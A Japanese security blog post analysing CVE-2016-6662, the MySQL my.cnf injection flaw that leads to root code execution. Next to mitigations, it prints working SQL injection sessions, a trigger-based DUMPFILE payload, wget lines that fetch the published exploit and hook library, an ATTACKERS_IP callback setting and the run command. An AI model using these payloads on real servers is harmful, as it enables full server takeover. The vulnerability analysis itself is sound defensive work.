---
layout: post
title:  "CVE-2016-6662 - Remote Root Code Execution / Privilege Escalation (0day)"
date:   2016-09-13 15:00:00 +0900
categories: vulnerability
toc: true
---

## 概要

[Dawid Golunski](http://legalhackers.com/)さんにより、MySQLの設定ファイルであるmy.cnfに悪意のある設定を注入できる脆弱性が発見されました。
この問題はデフォルト設定のすべてのMySQLサーバに影響します。
phpMyAdminやSQLinjectionなどのMySQLへのインターフェイスは攻撃を実行するためのプラットフォームとすることができます。
[アドバイザリ](http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt)では、攻撃者が任意のコードを実行し、その後root権限を奪取し完全にサーバを侵害することができることを示します。
SELinuxやAppArmorが導入されていてたとしてもデフォルトのアクティブなポリシーではこの攻撃を防ぐことはできません。

## CVSS v3

(2016/09/13時点でNVDでは未公開)

## 解決策、緩和策情報

 * 攻撃を実行され得るmysqlのユーザのFILE権限を落とす
   * CVE-2016-6663が公表されればFILE権限を落としてもmysql権限でファイルを作成される可能性がある、しかし今回のような悪意のあるshareライブラリをuploadすることはできなくなるので、本脆弱性単体でのroot権限の奪取は出来ないはず
 * /etc/my.cnf、/etc/mysql/my.cnf、SYSCONFDIR/my.cnf, $MYSQL_HOME/my.cnfなどのMySQLに読み込まれ得るmy.cnfのパーミッションをmysqlユーザから書き込めないようにする

## 影響を受けるソフトウェアとバージョン

 * MySQL

```
<= 5.7.15
<= 5.6.33
<= 5.5.52
```

 * MariaDB
 * PeroconaDb

## 技術的な詳細

デフォルトのMySQLのパッケージには多くの人に使用されているmysqld_safeスクリプトが付属しています。

```
root@CVE-2016-6662:~# lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.5 (jessie)
Release:        8.5
Codename:       jessie
root@CVE-2016-6662:~# dpkg -l | grep -i mysql-server
ii  mysql-server                   5.5.50-0+deb8u1             all          MySQL database server (metapackage depending on the latest version)
ii  mysql-server-5.5               5.5.50-0+deb8u1             amd64        MySQL database server binaries and system database setup
ii  mysql-server-core-5.5          5.5.50-0+deb8u1             amd64        MySQL database server binaries
root@CVE-2016-6662:~# service mysql start
root@CVE-2016-6662:~# ps aux | grep mysqld
root     17493  0.0  0.3   4336  1620 ?        S    14:10   0:00 /bin/sh /usr/bin/mysqld_safe
mysql    17840  0.0  9.4 558156 47800 ?        Sl   14:10   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

上記の通りmysqld_safeプロセスはroot権限として実行されており、mysqldのプロセスはmysql権限で動いており、 mysqld_safeには以下の関数が含まれています。

```
   313  # set_malloc_lib LIB
   314  # - If LIB is empty, do nothing and return
   315  # - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
   316  #   then pkglibdir.  tcmalloc is part of the Google perftools project.
   317  # - If LIB is an absolute path, assume it is a malloc shared library
   318  #
   319  # Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
   320  # running mysqld.  See ld.so for details.
   321  set_malloc_lib() {
   322    malloc_lib="$1"
   323
   324    if [ "$malloc_lib" = tcmalloc ]; then
   325      pkglibdir=`get_mysql_config --variable=pkglibdir`
   326      malloc_lib=
   327      # This list is kept intentionally simple.  Simply set --malloc-lib
   328      # to a full path if another location is desired.
   329      for libdir in /usr/lib "$pkglibdir" "$pkglibdir/mysql"; do
   330        for flavor in _minimal '' _and_profiler _debug; do
   331          tmp="$libdir/libtcmalloc$flavor.so"
   332          #log_notice "DEBUG: Checking for malloc lib '$tmp'"
   333          [ -r "$tmp" ] || continue
   334          malloc_lib="$tmp"
   335          break 2
   336        done
   337      done
```

このコードはmysqlサーバ起動時にsahredライブラリをpreloadするために使用することができます。このライブラリはmysqld_safeに以下のパラメータを渡すことにより設定することができます。

```
--malloc-lib=LIB
```

このパラメータはmy.cnfの[mysqld]もしくは[mysqld_safe]セクションでも設定することができます。 攻撃者はroot権限で悪意のあるライブラリをpreloadさせるために、my.cnfに悪意のあるパスを指定します。この設定は手動での再起動、システムアップデート、パッケージのアップデート、システムのリブートなどにより反映されます。
2003年の公表されたMySQL3.23.55以前にversionに内在する脆弱性では以下のシンプルなステートメントで攻撃者はmysqlのコンフィグファイルを作成することができました。

```
SELECT * INFO OUTFILE '/var/lib/mysql/my.cnf'
```

この問題はOUTFILEで作成されるような誰でも書き込めるようなパーミッションを持つコンフィグファイルを読み込まないようにすることで対応されました。

 * OUTFILEで作成されるファイルのパーミッション

```
mysql> select 'CVE-2016-6662' INTO OUTFILE '/tmp/CVE-2016-6662';
Query OK, 1 row affected (0.00 sec)

root@CVE-2016-6662:~# ls -l /tmp/CVE-2016-6662
-rw-rw-rw- 1 mysql mysql 14  9月 13 15:52 /tmp/CVE-2016-6662
```

 * OUTFILEで作成される設定ファイルは読み込まれない

```
root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 root root 3533  7月 21 14:04 /etc/mysql/my.cnf
root@CVE-2016-6662:~# chown mysql:mysql /etc/mysql/my.cnf
root@CVE-2016-6662:~# chmod 666 /etc/mysql/my.cnf
root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw-rw-rw- 1 mysql mysql 3533  7月 21 14:04 /etc/mysql/my.cnf
root@CVE-2016-6662:~# service mysql restart
root@CVE-2016-6662:~# tail -f  /var/lib/mysql/CVE-2016-6662.test.err | grep -i world
Warning: World-writable config file '/etc/mysql/my.cnf' is ignored
Warning: World-writable config file '/var/lib/mysql/my.cnf' is ignored
```

また追加のプロテクトとしてOUTFILE/DUMPFILEを使用して存在するファイルを上書きすることはできなくなりました。

```
root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw------- 1 mysql mysql 3533  7月 21 14:04 /etc/mysql/my.cnf

mysql> select 'CVE-2016-6662' INTO OUTFILE '/etc/mysql/my.cnf';
ERROR 1086 (HY000): File '/etc/mysql/my.cnf' already exists
```

この古い脆弱性は2003年にMySQL3.23.55にて修正されたと信じられてきました。しかし以下に示すAttack Vectorの実行が可能です。

## mysqlユーザによって書き込み可能な設定ファイルを保持している場合、既存のMySQLの設定ファイルに悪意のある設定を注入することができる。

MySQLの設定ファイルはmysqld_safeの実行時にサポートされているすべての場所から読み込まれます。サポートされている場所はMySQLのVerisonによって異なり、[ドキュメント](http://dev.mysql.com/doc/refman/5.6/ja/option-files.html)により説明されています。

```
Unix、Linux、および OS X では、MySQL プログラムは起動オプションを次のファイルから指定された順 (トップの項目が最初に使用されます) で読み取ります。
 * /etc/my.cnf : グローバルオプション
 * /etc/mysql/my.cnf : グローバルオプション
 * SYSCONFDIR/my.cnf : グローバルオプション
 * $MYSQL_HOME/my.cnf : サーバー固有のオプション
 * defaults-extra-file :    --defaults-extra-file=path によって指定されるファイル (ある場合)
 * ~/.my.cnf : ユーザー固有のオプション
 * ~/.mylogin.cnf : ログインパスオプション
MYSQL_HOME はサーバー固有の my.cnf ファイルが存在するディレクトリへのパスを含む環境変数です。MYSQL_HOME がセットされていない状態で mysqld_safe プログラムを使ってサーバーを起動すると、mysqld_safe は次のように MYSQL_HOME をセットしようとします。
BASEDIR および DATADIR が、それぞれ MySQL ベースディレクトリとデータディレクトリのパス名を示すようにします。
DATADIR には my.cnf ファイルが存在し、BASEDIR には存在しない場合、mysqld_safe は MYSQL_HOME を DATADIR にセットします。
そうでない場合は、MYSQL_HOME がセットされておらず、my.cnf ファイルが DATADIR に存在しない場合、mysqld_safe は BASEDIR に MYSQL_HOME をセットします。
```

MySQLの設定ファイルはmysqlユーザにより所有されていなければならないという誤解はかなり多く見受けられます。この誤解はBLOGやチュートリアル、chefやansibleの様なプロビジョニングツールのレシピなどに見られます。MySQLの設定ファイルはmysqlユーザ以外の所有権であったとしても適切に動作します。 有効なパスにmysqlユーザが読み書き可能な設定ファイルが存在する場合、攻撃者は以下のようにして設定ファイルに悪意のある設定をインジェクションすることができます。

 * mysqlユーザが読み書きできるmy.cnf

```
root@CVE-2016-6662:~# ls -l /etc/my.cnf
-rw------- 1 mysql mysql 70  9月 13 17:31 /etc/my.cnf
root@CVE-2016-6662:~# cat /etc/my.cnf
[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M
```

 * my.cnfに設定を注入

```
mysql> set global general_log_file = '/etc/my.cnf';
Query OK, 0 rows affected (0.00 sec)
mysql> set global general_log = on;
Query OK, 0 rows affected (0.00 sec)
mysql> select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '> malloc_lib=/tmp/mysql_exploit_lib.so
    '>
    '> [separator]
    '>
    '> ';
+-----------------------------------------------------------------------------------------+
| ; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

   |
+-----------------------------------------------------------------------------------------+
|

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

 |
+-----------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> set global general_log = off;
Query OK, 0 rows affected (0.00 sec)
```

 * 注入後の/etc/my.cnf

```
root@CVE-2016-6662:~# ls -l /etc/my.cnf
-rw------- 1 mysql mysql 422  9月 13 17:33 /etc/my.cnf
root@CVE-2016-6662:~# cat /etc/my.cnf
[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160913 17:33:16    37 Query     select '

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

'
160913 17:33:42    37 Query     set global general_log = off
```

この設定ファイルには有効ではない記述が含まれているため、mysqlの起動に失敗します。
しかし重要なのは以下の設定がmy.cnfに含まれていることです。

```
[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so
```

mysqldデーモンの起動前に、mysqld_safeが正しく共有ライブラリパスを読み込んでLD_PRELOAD環境変数に追加します。 プリロードされたライブラリは、その後のlibcのfopen()の呼び出しをフックし、mysqldデーモンによって処理され設定前に起動します。

## MySQLデータディレクトリ(デフォルトで書き込み可能になっている)に新たな設定ファイルの作成することができる。

mysqld_safeにはmysql data direcotoryに配置されたmy.cnfを読み込みパスに追加するためのコードが存在します。

```
   418  # Try where the binary installs put it
   419  if test -d $MY_BASEDIR_VERSION/data/mysql
   420  then
   421    DATADIR=$MY_BASEDIR_VERSION/data
   422    if test -z "$defaults" -a -r "$DATADIR/my.cnf"
   423    then
   424      defaults="--defaults-extra-file=$DATADIR/my.cnf"
   425    fi
```

データディレクトリの/var/lib/mysqlはmysqlユーザによって明らかに書き込みが可能です。

```
root@CVE-2016-6662:~# ls -ld /var/lib/mysql
drwx------ 5 mysql mysql 4096  9月 13 17:48 /var/lib/mysql
```

したがって、攻撃者がMySQLのFILEパーミッションを持つ場合、以下のパスに設定ファイルを作成することにより、悪意のある設定を読み込ませることができます。

```
/var/lib/mysql/my.cnf 
```

OUTFILEを利用した方法では、作成されるファイルのパーミッションは前述の通り、誰でも読み書き可能なmysql所有のファイルになるため設定ファイルとして読み込まれることはありません。

```
mysql> SELECT 'malicious config entry' INTO OUTFILE '/var/lib/mysql/my.cnf';
Query OK, 1 row affected (0.00 sec)

root@CVE-2016-6662:~# ls -l /var/lib/mysql/my.cnf
-rw-rw-rw- 1 mysql mysql 23  9月 13 18:57 /var/lib/mysql/my.cnf

root@CVE-2016-6662:/var/log/mysql# tail -f /var/log/mysql/error.log | grep -i world
Warning: World-writable config file '/var/lib/mysql/my.cnf' is ignored
```

しかし、攻撃者はloggin SQL statementを利用することにより、この制限を迂回することができます。

```
mysql> set global general_log_file = '/var/lib/mysql/my.cnf';
Query OK, 0 rows affected (0.00 sec)

mysql> set global general_log = on;
Query OK, 0 rows affected (0.00 sec)

mysql>  select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '>  malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
    '>
    '>  [separator]
    '> ';
+--------------------------------------------------------------------------------------------------------+
| ; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
   |
+--------------------------------------------------------------------------------------------------------+
|

; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
 |
+--------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> set global general_log = off;
Query OK, 0 rows affected (0.01 sec)
```

このオペレーションで作成されるmy.cnfはotherのrwが欠如しているため、mysqlはこのファイルをロードしようとします。

```
root@CVE-2016-6662:~# ls -l /var/lib/mysql/my.cnf
-rw-rw---- 1 mysql mysql 367  9月 13 19:02 /var/lib/mysql/my.cnf
root@CVE-2016-6662:~# cat /var/lib/mysql/my.cnf
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160913 19:02:44    37 Query     select '

; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
'
160913 19:02:53    37 Query     set global general_log = off
```

しかしmy.cnfは有効なセクションヘッダーから開始されなければ、適切にロードされることはありません。さらなるテストでは、このセキュリティを回避することが可能であることを示します。 しかし、現在アドバイザリにはこれらの情報は含まれません。 CVE-2016-6663のCVEIDを割り当てられているアドバイザリでは、現在開示を保留していますが、FILE権限なしで任意のコンテンツを持つ/var/lib/mysql/my.cnfを作成します。


## 攻撃者はSELECT/FILE権限を持っている場合、logging functionへのアクセスを取得し、設定ファイルを作成することができる。

攻撃者は以下のようなクエリを実行することにより、SELECTとFILEのみのパーミッションしか保有していなくても、logging
functionを実行することができます。(通常これにはsuper権限が必要です)

```
SELECT "CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `active_table` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select \"
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

\" INTO void;   
   set global general_log = off;
END;
" INTO DUMPFILE '/var/lib/mysql/wp_db/active_table.TRG'; 
```

アドバイザリのexploitから必要なコードを抜き出して、[access_logging_function.py](https://gist.github.com/KosukeShimofuji/68bb706aabfa2efc0dfafbfc3b007fde)を作成し、発生する現象というものを観察してみます。

 * MySQLの事前準備

```
kosuke@scapegoat ~ $ mysql -uroot -pmysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.50-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE DATABASE pocdb;
Query OK, 1 row affected (0.00 sec)

mysql> GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
Query OK, 0 rows affected (0.00 sec)

mysql> GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';
Query OK, 0 rows affected (0.00 sec)

mysql> select User,File_priv,Super_priv,Trigger_priv from mysql.user where user='attacker';
+----------+-----------+------------+--------------+
| User     | File_priv | Super_priv | Trigger_priv |
+----------+-----------+------------+--------------+
| attacker | Y         | N          | N            |
+----------+-----------+------------+--------------+
1 row in set (0.00 sec)

mysql> exit
Bye
```

 * 実行

```
python ./access_logging_function.py -dbuser attacker -dbpass 'p0cpass!' -dbhost scapegoat.test -dbname pocdb -mycnf /var/lib/mysql/my.cnf
```

![access_logging_function]({{site.baseurl}}/images/2016/09/14/access_logging_function.gif)

ネットの情報では本攻撃にはSuper_privが必要という記述をちらほらみますがご覧の通り、特筆すべき点としてこの攻撃にSuper_privは必要ありません。またTrigger_privも必要ありません。 また、この攻撃にはすでにmysqlで書き込み可能なmy.cnfが必要という記述も見かけますが、その性質は本質的な箇所ではないと思います。 Exploitでmysql権限で書き込めるmy.cnfを必要としているのはうまくセクションをこの手法では書けないからだと推測しますが、Dawid Golunskiさんは前述の通り、公表はしていないがうまくセクションヘッダを書く手法を知っていると記述しています。

## Proof of Concept

脆弱なMySQLサーバを持つホストと攻撃者が使用するホストを用意する

 * scapegoat.test 攻撃対象ホスト
 * attacker.test  攻撃者のホスト

### 事前準備

 * MySQLの設定

```
kosuke@scapegoat ~ $ mysql -uroot -pmysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.50-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE DATABASE pocdb;
Query OK, 1 row affected (0.00 sec)

mysql> GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
Query OK, 0 rows affected (0.00 sec)

mysql> GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';
Query OK, 0 rows affected (0.00 sec)

mysql> select User,File_priv,Super_priv from mysql.user where user='attacker';
+----------+-----------+------------+
| User     | File_priv | Super_priv |
+----------+-----------+------------+
| attacker | Y         | N          |
+----------+-----------+------------+
1 row in set (0.00 sec)

mysql> exit
Bye
```

 * MySQLの設定ファイルのパーミッションを脆弱にする

```
kosuke@scapegoat ~ $ ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 root root 3533  7月 21 14:04 /etc/mysql/my.cnf
kosuke@scapegoat ~ $ sudo chown mysql:mysql /etc/mysql/my.cnf
kosuke@scapegoat ~ $ sudo chmod 644 /etc/mysql/my.cnf
```

 * 攻撃用のexploitと悪意のあるshareモジュールをダウンロードする

```
kosuke@attacker ~ $ wget http://legalhackers.com/exploits/0ldSQL_MySQL_RCE_exploit.py
kosuke@attacker ~ $ wget http://legalhackers.com/exploits/mysql_hookandroot_lib.c
```

 * mysql_hookandroot_lib.cの攻撃者IPを書き換える

```
#define ATTACKERS_IP "192.168.10.103"
```

 * pythonの設定 

```
kosuke@attacker ~ $ pyenv install 2.7.11
kosuke@attacker ~ $ pyenv virtualenv 2.7.11 exploit
kosuke@attacker ~ $ git clone https://github.com/mysql/mysql-connector-python.git
kosuke@attacker ~ $ cd mysql-connector-python
kosuke@attacker ~ $ python ./setup.py build
kosuke@attacker ~ $ python ./setup.py install
```

### 攻撃の実施

```
python ./0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost scapegoat.test -dbname pocdb -mycnf /etc/mysql/my.cnf
```

![CVE-2016-6662]({{site.baseurl}}/images/2016/09/14/CVE-2016-6662.gif)


## まとめ

複数の問題を利用してroot権限の奪取を可能にしている。

 * 2003年に修正されたはずのother permissionを付与しないファイルの新規作成
 * 2003年に修正されたはずのファイル内容の変更
 * FILE権限のみでSuper権限とTrigger権限が必要な操作の実行

さらに未公表のCVE-2016-6663にはFILE権限すら必要なく、mysqlの設定ファイルを任意に書き換えることができること示唆している。

## 情報源


 * [CERT](https://www.kb.cert.org/vuls/byid?query=CVE-2016-6662&searchview=)
 * [Debian](https://security-tracker.debian.org/tracker/CVE-2016-6662)
 * [Github](https://github.com/search?q="CVE-2016-6662")
 * [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-6662)
 * [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6662)
 * [PacketStorm](https://packetstormsecurity.com/search/?q=CVE-2016-6662)
 * [Redhat](https://access.redhat.com/security/cve/CVE-2016-6662)
 * [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-6662.html)
 * [bugtraq](https://marc.info/?s=CVE-2016-6662&l=bugtraq)
 * [exploitdb](https://www.exploit-db.com/search/?action=search&cve=2016-6662)
 * [fulldisc](https://marc.info/?s=CVE-2016-6662&l=full-disclosure)
 * [metasploit](https://www.rapid7.com/db/search?q=CVE-2016-6662)
 * [oss-sec](https://marc.info/?s=CVE-2016-6662&l=oss-security)

## 参考文献

 * http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt
 * https://www.reddit.com/r/netsec/comments/52dgxh/mysql_remote_root_code_execution_privilege/
 * http://www.itmedia.co.jp/news/articles/1609/13/news055.html
 * http://qiita.com/yoku0825/items/dcdffae9e95658d86502
 * https://twitter.com/search?q=CVE-2016-6662&src=typd

